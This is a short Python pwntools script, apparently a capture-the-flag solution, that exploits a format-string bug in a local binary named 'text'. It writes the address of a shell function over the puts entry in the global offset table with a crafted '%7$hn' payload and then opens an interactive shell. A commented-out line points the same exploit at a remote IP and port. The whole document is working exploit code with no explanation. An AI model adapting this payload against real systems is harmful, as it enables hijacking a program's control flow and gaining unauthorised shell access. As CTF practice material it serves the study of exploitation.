from pwn import *

puts_got = 0x804a014
shell = 0x08048526

p = process("./text")
# p = remote("103.200.7.156", 2102)

payload = ''
payload += '\x14\xa0\x04\x08'
payload += '%7${}p'.format(0x8526 - len(payload))
payload += '%7$hn'

# gdb.attach(p, '''
#             b *0x80485ec
#             c
#             ''')

p.sendline(payload)
p.interactive()